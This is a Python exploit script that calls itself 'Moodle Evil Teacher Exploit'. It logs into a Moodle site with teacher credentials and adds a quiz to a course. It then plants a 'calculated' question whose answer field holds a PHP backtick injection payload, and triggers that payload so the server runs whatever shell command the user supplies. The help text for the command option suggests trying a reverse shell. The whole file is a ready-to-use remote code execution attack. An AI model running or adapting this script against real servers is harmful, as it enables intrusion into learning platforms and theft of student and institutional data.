import requests, argparse, re, random, string

def triggerPayload(s, url, questionID, quizID, payload):
    sendGET(s, url+"/question/question.php", {"id": questionID, "cmid": quizID, "wizardnow": "datasetitems", "0":payload})

def createEvilQuestion(s, url, quizName, sessKey, courseID, quizID):
    evilQuestionReq = sendPOST(s, url+"/question/question.php", {
	"cmid": quizID,
	"courseid": courseID,
	"qtype": "calculated",
	"sesskey": sessKey,
	"_qf__qtype_calculated_edit_form": "1",
	"category": "2,21",
	"name": f"{quizName}",
	"questiontext[text]": f"<p>{quizName}<br></p>",
	"defaultmark": "1",
	"tolerancetype[0]": "1",
	"answer[0]": "/*{a*/`$_GET[0]`;//{x}}",
	"fraction[0]": "1.0",
	"feedback[0][format]": "1",
	"unitrole": "3"
    })
    if evilQuestionReq.status_code // 100 != 3 or not "&id=" in evilQuestionReq.headers["Location"]:
    	return False
    return re.findall('&id=(\d+)', evilQuestionReq.headers['Location'])[0]

def findQuizID(s, url, courseID, quizName):
    myPageReq = sendGET(s, url+"/course/view.php", {"id":courseID})
    quizID = re.findall(f"data-itemid=\"(\d+)\"\n[ ]+data-value=\"{quizName}\"", myPageReq.text)
    if len(quizID) == 0:
    	return False
    return quizID[0]

def addQuiz(s, url, sessKey, courseID):
    quizName = f"haxx-{''.join([random.choice('0123456789abcdef') for _ in range(32)])}"
    addQuizReq = sendPOST(s, url+"/course/modedit.php", {
    "course": courseID,
    "sesskey": sessKey,
    "add": "quiz",
    "section": "0",
    "_qf__mod_quiz_mod_form": "1",
    "name": quizName,
    "feedbacktext[0][format]": "1",
    "visible": "1",
    "availabilityconditionsjson": "{\"op\":\"&\", \"c\":[], \"showc\":[]}"
    })
    
    if addQuizReq.status_code // 100 != 3:
    	return False
    return quizName
    	

def enableEditing(s, url, sessKey, courseID):
    coursePage = sendGET(s, url+"/course/view.php", {"id":courseID, "sesskey":sessKey, "edit":"on"})
    if not coursePage or "Can not find data record in database table course." in coursePage.text:
    	print("Failed to get course page")
    	return False
    if "notifyeditingon=1" in coursePage.headers["Location"]:
    	return True
    return False

def getCourses(s, url):
    myPage = sendGET(s, url+"/my/")
    if not myPage:
    	print("Failed to get my page")
    	return False
    return set(re.findall("/course/view\.php\?id=(\d+)", myPage.text))

def attemptLogin(s, url, username, password):
    testLoginPage = sendGET(s, url+"/login/index.php")
    if not testLoginPage:
    	print("Failed to get login page")
    	return False
    	
    params = {"username": username, "password": password}
    
    regex = re.search('<input type="hidden" name="logintoken" value="[a-zA-Z0-9]+">', testLoginPage.text)
    if regex:
    	m = regex.group()
    	m = m.split(" ")[-1]
    	token = m[7:-2]
    	params["logintoken"] = token
    	print(f"Found login token: {token}")
    	
    redirectURL = sendPOST(s, url+"/login/index.php", params).headers["Location"]
    if not "testsession" in redirectURL:
    	return False
    	
    return re.findall("\"sesskey\":\"([a-zA-Z0-9]+)\"", sendGET(s, url+"/my/").text)[0]
    
    	

def sendPOST(s, url, params={}, json=False):
    try:
        if not json:
            return s.post(url, data=params, verify=False, allow_redirects=False)
        return s.post(url, json=params, verify=False, allow_redirects=False)
    except requests.exceptions.ConnectionError:
        print("Request Failed")
        return False

def sendGET(s, url, params={}, json=False):
    try:
        if not json:
            return s.get(url, params=params, verify=False, allow_redirects=False)
        return s.get(url, json=params, verify=False, allow_redirect=False)
    except requests.exceptions.ConnectionError:
        return False

def parseArgs():
    parser = argparse.ArgumentParser(prog='Moodle Evil Teacher Exploit')
    parser.add_argument("-u", "--url", help="Target URL", required=True)
    parser.add_argument("-l", "--login", help="Login username", required=True)
    parser.add_argument("-p", "--password", help="Login password", required=True)
    parser.add_argument("-c", "--command", help="Command to execute (Note: this is blind so maybe try a reverse shell or something)", required=True)
    parser.add_argument("-P", "--proxy", help="Proxy (optional)")
    return parser.parse_args()

def main():
    args = parseArgs()
    url, cmd, username, password = args.url, args.command, args.login, args.password
    s=requests.session()
    if args.proxy:
    	s.proxies = {"http":args.proxy, "https":args.proxy}
    	
    print(f"Testing connection to {url}")
    if not sendGET(s, url):
        print("Initial connection failed")
        return
    print("Connection Successful")
    
    print("Attempting to login")
    sessKey = attemptLogin(s, url, username, password)
    print(f"Found session key: {sessKey}")
    if not sessKey:
        print("Login failed")
        return
    print("Login successful")

    print("Gathering courses")
    courses = getCourses(s, url)
    if not courses:
    	print("Found no courses")
    	return
    	
    enabledCourse = 0
    for courseID in courses:
    	print(f"Found course ID: {courseID}")
    	print(f"Attempting to enable editing")
    	if not enableEditing(s, url, sessKey, courseID):
    		print("Failed to enable editing")
    		continue
    	print("Editing enabled")
    	enabledCourse = courseID
    	break
    else:
    	print("Failed to enable editing on any courses")
    	return
    	
    print("Attempting to add quiz")
    quizName = addQuiz(s, url, sessKey, enabledCourse)
    if not quizName:
    	print("Failed to add quiz")
    	return
    print("Quiz added successfully")
    
    print("Finding new quiz ID")
    quizID = findQuizID(s, url, enabledCourse, quizName)
    if quizID == False:
    	print("Failed to find quiz ID")
    	return
    print(f"Found quiz ID: {quizID}")
    
    print("Adding malicious question")
    questionID = createEvilQuestion(s, url, quizName, sessKey, enabledCourse, quizID)
    if questionID == False:
    	print("Failed to add malicious question")
    	return
    print(f"Malicious question added successfully with ID: {questionID}")
    
    print("Triggering payload")
    triggerPayload(s, url, questionID, quizID, cmd)
    
    
if __name__ == "__main__":
    main()
